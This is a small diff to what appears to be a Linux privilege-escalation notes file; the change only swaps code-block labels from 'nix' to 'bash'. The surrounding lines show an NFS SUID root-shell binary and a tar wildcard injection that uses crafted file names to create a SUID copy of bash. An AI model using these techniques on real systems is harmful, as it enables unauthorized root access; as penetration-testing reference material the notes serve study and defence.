@@ -208,7 +208,7 @@ int main() {
     system("/bin/bash");
 }
 ```
-```nix
+```bash
 gcc rootshell.c -o rootshell
 ```
 Copy `rootshell` executable to the mounted share and set SUID bit
@@ -228,7 +228,7 @@ If a command is calling for a wildcard we may be able to inject a command instea
 tar -cf /opt/backups/website.tar *
 ```
 In order to exploit this, we run the following commands inside the `/opt/backups` directory:
-```nix
+```bash
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
